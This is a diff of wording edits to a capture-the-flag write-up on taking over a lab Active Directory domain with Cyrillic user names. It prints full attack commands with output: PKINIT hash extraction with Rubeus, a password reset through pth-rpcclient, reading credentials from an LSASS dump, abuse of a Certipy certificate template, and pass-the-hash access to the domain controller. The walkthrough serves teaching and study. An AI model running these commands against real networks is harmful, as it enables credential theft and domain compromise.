@@ -28,13 +28,13 @@ Category: AD, Pentest
 
 All the difficulty stands in the poor compatibility of tools with unicode characters, the attack path is pretty simple:
 
-1. Port scan, identify a web server on the domain controller serving 3 PFX without password
+1. Port scan, identify a web server on the domain controller serving 3 PFX files without password
 2. Use PKINIT authentication and UnPAC-the-hash to retrieve NTLM hashes (Rubeus)
 3. Use BloodHound.py with previously retrieved hashes and identify an attack path to the PC1
-4. Use Валерий owned account to reset Зинаида password and connect to PC1 as admin and get first flag
-5. Dump PC1 lsass memory and get Дарья account password
-6. Use Certipy to enumerate ADCS template and identify that Professor account (Дарья) is allowed to emit certificate with arbitrary SAN
-7. Request a PFX for the Administrator user (администратор in cyrillic) and replay step 2 to get his hash
+4. Use "Валерий" owned account to reset "Зинаида" account password and connect to PC1 as admin and get first flag
+5. Dump PC1 lsass memory and get "Дарья" account password
+6. Use Certipy to enumerate ADCS template and identify that the Professor account ("Дарья") is allowed to request certificates with arbitrary SAN
+7. Request a PFX for the Administrator user ("администратор" in russian) and replay step 2 to get their hash
 8. Pass the hash to access DC1 and get second flag
 
 ### First part
@@ -130,17 +130,8 @@ PORT     STATE SERVICE       VERSION
 5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 |_http-server-header: Microsoft-HTTPAPI/2.0
 |_http-title: Service Unavailable
-Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
-Device type: general purpose
-Running (JUST GUESSING): FreeBSD 6.X (86%)
-OS CPE: cpe:/o:freebsd:freebsd:6.2
-Aggressive OS guesses: FreeBSD 6.2-RELEASE (86%)
-No exact OS matches for host (test conditions non-ideal).
-Uptime guess: 0.403 days (since Fri Apr  1 14:40:44 2022)
-Network Distance: 2 hops
-TCP Sequence Prediction: Difficulty=261 (Good luck!)
-IP ID Sequence Generation: Incremental
-Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+[...]
 
 Host script results:
 |_clock-skew: mean: -1h00m02s, deviation: 0s, median: -1h00m03s
@@ -151,10 +142,7 @@ Host script results:
 |   3.1.1: 
 |_    Message signing enabled and required
 
-TRACEROUTE (using port 80/tcp)
-HOP RTT      ADDRESS
--   Hop 1 is the same as for 10.0.20.19
-2   41.05 ms 10.0.20.11
+[...]
 
 Nmap scan report for 10.0.20.19
 Host is up (0.0020s latency).
@@ -186,37 +174,27 @@ PORT     STATE SERVICE       VERSION
 5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 |_http-server-header: Microsoft-HTTPAPI/2.0
 |_http-title: Service Unavailable
-No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
-TCP/IP fingerprint:
-OS:SCAN(V=7.92%E=4%D=4/2%OT=135%CT=1%CU=43721%PV=Y%DS=2%DC=T%G=Y%TM=62477AA
-OS:7%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=109%TI=I%CI=I%TS=U)OPS(O1=M
-OS:54CNW8NNS%O2=M54CNW8NNS%O3=M54CNW8%O4=M54CNW8NNS%O5=M54CNW8NNS%O6=M54CNN
-OS:S)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%
-OS:W=FFFF%O=M54CNW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=
-OS:N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=
-OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T
-OS:7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE
-OS:(R=N)
+[...]
 ```
 
-We have 2 computers within the same Active Directory domain `CONTI.RU`:
+We have 2 computers within the same `CONTI.RU` Active Directory domain:
     
 - a domain controller `DC1.CONTI.RU` at **10.0.20.11** with the ADCS role enabled
-- a joined computer `PC1.CONTI.RU` at **10.0.20.19**
+- a domain-joined computer `PC1.CONTI.RU` at **10.0.20.19**
 
-By heading towards the domain controller web site on port TCP/80, it is possible to download 3 unprotected PFX for 3 different users:
+By heading towards the domain controller web site on port TCP/80, it is possible to download 3 unprotected PFXs for 3 different users:
 - `Наистина`
 - `Вячеслав`
 - `Валерий`
 
-These PFX files contains the certificate with the associated private keys required to authenticate on behalf of those users on the domain `CONTI.RU`.
+These PFX files contain certificates with their associated private key allowing to authenticate on behalf of those users on the `CONTI.RU` domain.
 
 The first step is to get the Alternate Name from the certificates:
 ![PFX details](/assets/breizhctf-22-pfx-details.png)
 
-Then, we tried to use Dirkjanm [PKINITTools](https://github.com/dirkjanm/PKINITtools) to get a TGT via PKINIT, but the tool failed to handle unicode characters correctly.
+Then, we tried to use @_dirkjan's [PKINITTools](https://github.com/dirkjanm/PKINITtools) to get a TGT via PKINIT, but the tool failed to handle unicode characters correctly.
 
-Using `Rubeus` `asktgt` command, we can retrieve a TGT and fetch the NTLM hashes of the 3 accounts with `/getcredentials`. Note that PowerShell replace unicode characters by `??????` but it works like a charm:
+Using `Rubeus` `asktgt` command, we can retrieve a TGT and fetch the NTLM hash of the 3 accounts with `/getcredentials`. Note that the PowerShell console replaces unicode characters by `??????` but it works like a charm:
 
 ```
 PS C:\Users\user\Downloads> ./Rubeus.exe asktgt /user:????????????? /certificate:?????????????.pfx /domain:conti.ru /dc:10.0.20.11 /createnetonly:C:\Windows\System32\cmd.exe /getcredentials
@@ -238,9 +216,9 @@ PS C:\Users\user\Downloads> ./Rubeus.exe asktgt /user:????????????? /certificate
 [*] Building AS-REQ (w/ PKINIT preauth) for: 'conti.ru\?????????????'
 [*] Target LUID : 3398571
 [*] Using domain controller: 10.0.20.11:88
-[X] KRB-ERROR (37) : KRB_AP_ERR_SKEWPS 
+[X] KRB-ERROR (37) : KRB_AP_ERR_SKEW
 ```
-The error `KRB_AP_ERR_SKEWPS` indicates that we have a time drift with the DC, we need to change time of our client to comply with the server. Fortunatly, the domain controller indicates its time in the Kerberos exchange:
+The error `KRB_AP_ERR_SKEW` indicates that we have a time drift with the DC: we need to change time of our client to comply with the server. Fortunatly, the domain controller indicates its time in the Kerberos exchange:
 
 ![Kerberos SKEW](/assets/breizhctf-22-kerberos-skew.png)
 
@@ -311,9 +289,9 @@ It works! We are able to retrieve 3 NTLM hashes for 3 users in `CONTI.RU` domain
 | B              | Вячеслав       | 78DD51AEF64338AD248FF80B25849C44 |
 | C              | Валерий        | BE5C60EC1E9ED48B1ACB5C87D555C6E2 |
 
-We can now gather information on the domain via different tools (smbclient, rpcclient, cme, ...) and perform a BloodHound collection to search for privilege escalation paths.
+We can now gather information from the domain via different tools (smbclient, rpcclient, cme, ...) and perform a BloodHound collection to search for privilege escalation paths.
 
-User enumeration with user C:
+Domain users enumeration with user C:
 ```
 $ crackmapexec smb 10.0.20.11 -u Валерий -H 'BE5C60EC1E9ED48B1ACB5C87D555C6E2' --users 
 CONTI.RU\Администратор                  Встроенная учетная запись администратора компьютера/домена
@@ -349,15 +327,15 @@ CONTI.RU\Феттаерт                       HR
 CONTI.RU\Ярослав                        Developers' teamlead / OSINT research
 ```
 
-[Bloodhound.py](https://github.com/fox-it/BloodHound.py) execution with user C:
+[Bloodhound.py](https://github.com/fox-it/BloodHound.py) data collection with user C:
 ```
 $ python bloodhound.py -u Валерий --hashes 00000000000000000000000000000000:BE5C60EC1E9ED48B1ACB5C87D555C6E2 -d CONTI.RU -dc DC1.CONTI.RU -ns 10.0.20.11 -c All
 ```
 
-A path from the owned user `CONTI.RU\ВАЛЕРИЙ` (user C) to `CONTI.RU\ЗИНАИДА` (let's call him user D), a local admin of `PC1.CONTI.RU` stands out. Indeed, user C has a `GenericAll` permission on user D, which allows password reset:
+A path from the owned user `CONTI.RU\ВАЛЕРИЙ` (user C), to `CONTI.RU\ЗИНАИДА` (let's call him user D), who is a local admin of `PC1.CONTI.RU`, stands out. Indeed, user C has a `GenericAll` permission on user D, which allows password reset:
 ![BloodHound attack path](/assets/breizhctf-22-bloodhound-path.png)
 
-We perform the password reset via `pth-rpcclient` and `setuserinfo2` RPC call:
+We perform the password reset with `pth-rpcclient` and the `setuserinfo2` RPC call:
 ```
 $ pth-rpcclient -U CONTI.RU/Валерий%00000000000000000000000000000000:BE5C60EC1E9ED48B1ACB5C87D555C6E2 //10.0.20.11
 
@@ -366,7 +344,7 @@ E_md4hash wrapper called.
 E_deshash wrapper called.
 ```
 
-From this point, we can connect to `PC1.CONTI.RU` with `CONTI.RU\ЗИНАИДА` and get the first flag on the desktop:
+From this moment, we can connect to `PC1.CONTI.RU` with `CONTI.RU\ЗИНАИДА` and get the first flag on the desktop:
 ![SMBClient first flag](/assets/breizhctf-22-first-flag.png)
 
 ```
@@ -378,7 +356,7 @@ BZHCTF{i_hope_you_love_playing_with_cyrillic}
 
 We are local administrator of `PC1.CONTI.RU`, we now want to get domain administrator privileges. We execute post-exploitation tools on `PC1.CONTI.RU` to gather more information: dump lsass memory with procdump, SAM dump, LSA secrets, DPAPI, etc.
 
-From LSASS memory dump, we can collect the credentials of the user `CONTI.RU\Дарья` (user E):
+From the LSASS memory dump, we can extract the credentials of the user `CONTI.RU\Дарья` (user E), using mimikatz in minidump mode:
 ```
 Authentication Id : 0 ; 337548 (00000000:0005268c)
 Session           : Interactive from 1
@@ -408,11 +386,11 @@ SID               : S-1-5-21-2511036384-2806266831-3360082211-1122
         cloudap :       KO
 ```
 
-From the BloodHound point of view, this user does not have any interesting privileges, nor any privileges on the `PC1.CONTI.RU` computer.
+From the BloodHound point of view, this user does not have any interesting privileges, nor any privileges on the `PC1.CONTI.RU` computer...
 
-We have to find another way to escalate privileges. At the beginning of the challenge, we had to play with PKINIT and PFX. Our nmap scan reveals that there is an ADCS role installed on the domain controller and we didn't look at it yet. Time for ADCS information gathering!
+We have to find another way to escalate privileges. At the beginning of the challenge, we had to play with PKINIT and PFX. Our nmap scan revealed that there is an ADCS role installed on the domain controller and we didn't look at it yet. Time for ADCS information gathering!
 
-We use [Certipy](https://github.com/ly4k/Certipy) excellent tool to enumerate ADCS objects and permissions:
+We use [Certipy](https://github.com/ly4k/Certipy), which is an excellent tool, to enumerate ADCS objects and permissions:
 ```
 $ certipy find -hashes "00000000000000000000000000000000:7a0f1f2a2b2a749312b97777b61cd6a5" 'CONTI.RU/Дарья@10.0.20.11'
 Certipy v2.0.9 - by Oliver Lyak (ly4k)
@@ -432,7 +410,7 @@ Certipy v2.0.9 - by Oliver Lyak (ly4k)
 [*] Saved BloodHound data to '20220401225602_Certipy.zip'. Drag and drop the file into the BloodHound GUI
 ```
 
-User E (RID = 1122 on the domain) found on `PC1.CONTI.RU` workstation can use the template `UserAfterLeak` to generate certificates (`Enroll` privilege) signed by the `CONTI-DC1-CA` certificate authority. The template has the properties we want to escalate privileges:
+User E (RID = 1122 on the domain), whom we found credentials on the `PC1.CONTI.RU` workstation, can use the template `UserAfterLeak` to generate certificates (`Enroll` privilege) signed by the `CONTI-DC1-CA` certificate authority. The template has the properties we want to escalate privileges:
 
 - **Client Authentication** so that we can generate certificate to authenticate users
 - **EnrolleeSuppliesSubject** so that we can choose arbitrary Subjet Alternative Name (SAN)
@@ -480,7 +458,7 @@ User E (RID = 1122 on the domain) found on `PC1.CONTI.RU` workstation can use th
           "IsInherited": false
       },
       {
-          "PrincipalSID": "S-1-5-21-2511036384-2806266831-3360082211-1122", // <== USER E we own
+          "PrincipalSID": "S-1-5-21-2511036384-2806266831-3360082211-1122", // <== USER E we pwned
           "PrincipalType": "User",
           "RightName": "Enroll",
           "IsInherited": false
@@ -488,7 +466,7 @@ User E (RID = 1122 on the domain) found on `PC1.CONTI.RU` workstation can use th
 [...]
 ```
 
-With this information, we can generate PFX for any users, so we choose the built-in domain administrator: `АДМИНИСТРАТОР@CONTI.RU`:
+With this information, we can generate PFX for any user, so we choose the built-in domain administrator: `АДМИНИСТРАТОР@CONTI.RU`:
 
 ```bash
 $ certipy req -hashes "00000000000000000000000000000000:7a0f1f2a2b2a749312b97777b61cd6a5" 'CONTI.RU/Дарья@10.0.20.11' -ca 'CONTI-DC1-CA' -template 'UserAfterLeak' -alt 'АДМИНИСТРАТОР@CONTI.RU'
@@ -501,7 +479,7 @@ Certipy v2.0.9 - by Oliver Lyak (ly4k)
 [*] Saved certificate and private key to 'администратор.pfx'
 ```
 
-Fire Rubeus to get the user NTLM hash:
+Fire Rubeus to get the target user's NTLM hash:
 ```
 PS C:\Users\user\Downloads> ./Rubeus.exe asktgt /user:????????????? /certificate:?????????????.pfx /domain:conti.ru /dc:10.0.20.11 /createnetonly:C:\Windows\System32\cmd.exe  /getcredentials
    ______        _
@@ -554,7 +532,7 @@ PS C:\Users\user\Downloads> ./Rubeus.exe asktgt /user:????????????? /certificate
        NTLM              : C9876588D1B9FBACAA9A6F8D5642BFA8
 ```
 
-With the administrator NTLM hash, we can connect to the domain controller:
+With the administrator's NTLM hash, we can connect to the domain controller:
 ```
 $ smbclient //10.0.20.11/C$ -U администратор --pw-nt-hash C9876588D1B9FBACAA9A6F8D5642BFA8 -W CONTI.RU
 smb: \> cd Users\администратор\Desktop\
@@ -567,7 +545,6 @@ smb: \Users\администратор\Desktop\> ls
                 26042623 blocks of size 4096. 22040327 blocks available
 smb: \Users\администратор\Desktop\> get flag.txt 
 getting file \Users\администратор\Desktop\flag.txt of size 37 as flag.txt (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)
-smb: \Users\администратор\Desktop\> ^C
 ```
 
 And finally, get the second flag:
@@ -578,8 +555,8 @@ BZHCTF{pwning_ru_domain_is_fun_no?}
 
 ### Final thoughts
 
-The challenge was not difficult from an Active Directory perspective. However, dealing with cyrillic characters was harder than we though because many tools don't support unicode correctly. We had to alternate between Linux and Windows tools to made it.
+The challenge was not difficult from an Active Directory perspective. However, dealing with cyrillic characters was harder than we thought because many tools don't support unicode correctly. We had to alternate between Linux and Windows tools to succeed.
 
-For instance, when passing the hash with Mimikatz the user name is replaced with litteral `?` during NTLM authentication. On the other side Sharpkatz seemed to work fine, but we had so mess up with lsass memory that nothing was working fine in the VM... On the other side, all linux tools seemed to accept unicode character except [PKINITTools](https://github.com/dirkjanm/PKINITtools) which if we're not mistaking relies on [minikerberos](https://github.com/skelsec/minikerberos) & [impacket](https://github.com/SecureAuthCorp/impacket).
+For instance, when passing the hash with Mimikatz, the user name is replaced with litteral `?` during NTLM authentication! On the other hand, SharpKatz seemed to work fine, but it seemed to mess up too much with lsass memory since nothing was working fine anymore in the VM... On the other hand, all linux tools seemed to accept unicode character except [PKINITTools](https://github.com/dirkjanm/PKINITtools), which if we're not mistaken, relies on [minikerberos](https://github.com/skelsec/minikerberos) & [impacket](https://github.com/SecureAuthCorp/impacket).
 
-Final words go to Kaluche, thanks very much for this challenge, we had a lot of fun!
+Final words go to the challenge's author, [Kaluche](https://twitter.com/kaluche_): thanks very much for this challenge, we had a lot of fun!
